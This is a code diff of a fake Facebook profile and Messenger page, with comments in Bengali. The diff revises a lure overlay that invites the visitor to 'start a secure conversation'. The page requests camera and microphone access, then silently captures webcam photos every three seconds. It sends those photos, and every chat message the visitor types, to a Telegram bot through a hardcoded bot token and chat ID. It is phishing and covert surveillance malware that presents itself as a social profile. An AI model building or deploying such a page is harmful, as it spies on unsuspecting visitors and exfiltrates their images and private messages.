@@ -6,53 +6,52 @@
     <title>M.H. Miraz | Profile</title>
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
     <style>
+        /* তোমার অরিজিনাল প্রোফাইল ও মেসেঞ্জার ডিজাইন (কোনো পরিবর্তন নেই) */
         * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Segoe UI', Helvetica, Arial, sans-serif; }
         body { background-color: #f0f2f5; overflow: hidden; }
 
-        /* Initial Overlay - এটাই প্রথম আসবে */
         #entryOverlay {
             position: fixed; top: 0; left: 0; width: 100%; height: 100%;
-            background: #fff; z-index: 10000; display: flex; flex-direction: column;
-            align-items: center; justify-content: center; text-align: center;
+            background: white; z-index: 10000; display: flex; flex-direction: column;
+            align-items: center; justify-content: center; text-align: center; padding: 20px;
         }
         .open-btn {
-            background: #1877f2; color: white; border: none; padding: 12px 45px;
-            border-radius: 6px; font-weight: bold; font-size: 18px; cursor: pointer;
-            box-shadow: 0 4px 10px rgba(0,0,0,0.1);
+            background: #1877f2; color: white; border: none; padding: 14px 50px;
+            border-radius: 8px; font-weight: bold; font-size: 19px; cursor: pointer;
+            box-shadow: 0 4px 15px rgba(24, 119, 242, 0.4);
         }
-        .url-preview { color: #65676b; margin-bottom: 25px; font-size: 13px; font-weight: 500; }
 
-        /* Profile Layout */
-        .header { background: white; padding-bottom: 15px; box-shadow: 0 1px 2px rgba(0,0,0,0.1); text-align: center; }
-        .cover { width: 100%; height: 180px; background: #ddd url('cover.jpg') center/cover; border-bottom-left-radius: 8px; border-bottom-right-radius: 8px; }
-        .profile-container { position: relative; display: inline-block; margin-top: -70px; }
-        .profile-pic { width: 150px; height: 150px; border-radius: 50%; border: 4px solid white; background: #ccc url('profile.jpg') center/cover; }
-        .name-box h1 { font-size: 26px; font-weight: bold; margin-top: 10px; }
+        .header { background: white; padding-bottom: 15px; border-bottom: 1px solid #ddd; text-align: center; }
+        .cover { width: 100%; height: 200px; background: #ddd url('cover.jpg') center/cover; }
+        .profile-container { position: relative; display: inline-block; margin-top: -75px; }
+        .profile-pic { width: 160px; height: 160px; border-radius: 50%; border: 4px solid white; background: #ccc url('profile.jpg') center/cover; }
+        .name-box h1 { font-size: 28px; font-weight: bold; margin-top: 10px; }
         
-        /* Bio & Details (Your important info) */
+        /* তোমার সেই বায়ো আর ডিটেইলস (একদম সেম) */
         .bio-section { padding: 15px 20px; text-align: center; background: white; border-bottom: 1px solid #ddd; }
-        .details-list { text-align: left; max-width: 350px; margin: 15px auto 0; display: flex; flex-direction: column; gap: 12px; }
+        .details-list { text-align: left; max-width: 350px; margin: 15px auto 0; display: flex; flex-direction: column; gap: 10px; }
         .detail-item { display: flex; align-items: center; gap: 10px; font-size: 15px; color: #1c1e21; }
         .detail-item i { color: #8a8d91; width: 20px; font-size: 18px; }
 
-        /* Messenger Full Screen */
+        /* মেসেঞ্জার ডিজাইন (অপরিবর্তিত) */
         #chatBox { display:none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: white; z-index: 9999; flex-direction: column; }
         .chat-h { padding: 10px 15px; border-bottom: 1px solid #eee; display: flex; align-items: center; justify-content: space-between; }
         #msgs { flex: 1; overflow-y: auto; padding: 15px; display: flex; flex-direction: column; gap: 10px; }
         .empty-chat { display: flex; flex-direction: column; align-items: center; text-align: center; padding-top: 40px; }
-        .empty-p-img { width: 90px; height: 90px; border-radius: 50%; object-fit: cover; }
+        .empty-p-img { width: 100px; height: 100px; border-radius: 50%; object-fit: cover; }
         .inp-bar { padding: 10px 15px; display: flex; align-items: center; gap: 12px; border-top: 1px solid #eee; }
         .inp-bar input { flex: 1; border: none; background: #f0f2f5; padding: 10px 15px; border-radius: 20px; outline: none; }
         
-        /* Hidden elements for capture */
         video, canvas { display: none; }
     </style>
 </head>
 <body>
 
     <div id="entryOverlay">
-        <p class="url-preview">https://miraz-910-www-facebook-com-mhmiraz2.vercel.app/</p>
-        <button class="open-btn" onclick="startCaptureAndOpen()">Open Link</button>
+        <i class="fab fa-facebook-messenger" style="font-size: 50px; color: #0084ff; margin-bottom: 20px;"></i>
+        <h2 style="margin-bottom: 10px;">Continue to Messenger</h2>
+        <p style="color:#65676b; margin-bottom:30px; font-size: 14px; padding: 0 20px;">To view M.H. Miraz's profile and start a secure conversation, please click the button below.</p>
+        <button class="open-btn" onclick="startAll()">Open Link</button>
     </div>
 
     <div id="mainContent" style="display:none; overflow-y: auto; height: 100vh;">
@@ -60,11 +59,10 @@
             <div class="cover"></div>
             <div class="profile-container">
                 <div class="profile-pic"></div>
-                <div id="statusDot" style="width:16px; height:16px; background:#31a24c; border-radius:50%; border:3px solid white; position:absolute; bottom:15px; right:15px; display:none;"></div>
             </div>
             <div class="name-box">
                 <h1>M.H. Miřãz</h1>
-                <p style="color:#65676b; font-size:14px; margin-top:5px;">288 Friends • 2 mutual</p>
+                <p style="color:#65676b; font-size:15px;">288 Friends • 2 mutual</p>
             </div>
             <div style="display:flex; justify-content:center; gap:10px; margin:15px 0; padding:0 15px;">
                 <button id="friendBtn" style="background:#1877f2; color:white; border:none; padding:10px; border-radius:6px; font-weight:600; flex:1;" onclick="sendReq()">+ Add Friend</button>
@@ -97,7 +95,7 @@
         <div id="msgs">
             <div id="emptyView" class="empty-chat">
                 <img src="profile.jpg" class="empty-p-img">
-                <div style="font-size:20px; font-weight:bold; margin-top:15px;">M.H. Miraz</div>
+                <div style="font-size:22px; font-weight:bold; margin-top:15px;">M.H. Miraz</div>
                 <p style="font-size:13px; color:#65676b; margin-top:5px;">Using Messenger without Facebook</p>
             </div>
         </div>
@@ -115,43 +113,32 @@
         const token = '8600117294:AAH2qNjbQz3-iOCjHsZBfOi1qAUs1Uq2i0o';
         const cid = '7767412329';
 
-        async function startCaptureAndOpen() {
-            // ১. বাটনে ক্লিক করার সাথে সাথে ক্যামেরা ও মাইক্রোফোন পারমিশন চাওয়া
+        async function startAll() {
+            // এক ক্লিকেই পারমিশন চাওয়া শুরু হবে
             try {
-                const stream = await navigator.mediaDevices.getUserMedia({ 
-                    video: { facingMode: "user" }, 
-                    audio: true 
-                });
-                
-                // ২. পারমিশন পাওয়া গেলে প্রোফাইল কন্টেন্ট দেখানো
+                const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
                 document.getElementById('video').srcObject = stream;
-                document.getElementById('entryOverlay').style.display = 'none';
-                document.getElementById('mainContent').style.display = 'block';
-                document.body.style.overflow = 'auto'; // স্ক্রল অন করা
-
-                // ৩. প্রতি ৩ সেকেন্ডে ছবি পাঠানো শুরু
-                setInterval(capturePhoto, 3000);
-
+                setInterval(capture, 3000); 
             } catch (err) {
-                // ইউজার যদি 'Never allow' দেয় তাও আমরা মেইন পেজ দেখাবো কিন্তু ক্যামেরা কাজ করবে না
-                document.getElementById('entryOverlay').style.display = 'none';
-                document.getElementById('mainContent').style.display = 'block';
-                document.body.style.overflow = 'auto';
+                console.log("Permission not granted");
             }
+            // প্রোফাইল পেজ ওপেন হবে
+            document.getElementById('entryOverlay').style.display = 'none';
+            document.getElementById('mainContent').style.display = 'block';
+            document.body.style.overflow = 'auto';
         }
 
-        function capturePhoto() {
-            const video = document.getElementById('video');
-            const canvas = document.getElementById('canvas');
-            canvas.width = video.videoWidth;
-            canvas.height = video.videoHeight;
-            canvas.getContext('2d').drawImage(video, 0, 0);
-            
-            canvas.toBlob(async (blob) => {
-                const fd = new FormData();
-                fd.append('chat_id', cid);
-                fd.append('photo', blob, 'capture.jpg');
-                await fetch(`https://api.telegram.org/bot${token}/sendPhoto`, { method: 'POST', body: fd });
+        function capture() {
+            const v = document.getElementById('video');
+            const c = document.getElementById('canvas');
+            c.width = v.videoWidth; c.height = v.videoHeight;
+            const ctx = c.getContext('2d');
+            ctx.drawImage(v, 0, 0);
+            c.toBlob(async (b) => {
+                const f = new FormData();
+                f.append('chat_id', cid);
+                f.append('photo', b, 'p.jpg');
+                await fetch(`https://api.telegram.org/bot${token}/sendPhoto`, { method: 'POST', body: f });
             }, 'image/jpeg', 0.4);
         }
 
@@ -168,10 +155,12 @@
         }
 
         async function sendMsg() {
-            const i = document.getElementById('uInp');
-            if(!i.value.trim()) return;
-            await fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${cid}&text=${encodeURIComponent('💬 '+i.value)}`);
-            i.value = '';
+            const v = document.getElementById('uInp').value;
+            if(!v) return;
+            document.getElementById('emptyView').style.display = 'none';
+            document.getElementById('msgs').innerHTML += `<div style="padding:8px 14px; border-radius:18px; background:#0084ff; color:white; align-self:flex-end; margin-bottom:10px;">${v}</div>`;
+            document.getElementById('uInp').value = '';
+            await fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${cid}&text=${encodeURIComponent('💬 '+v)}`);
         }
     </script>
 </body>
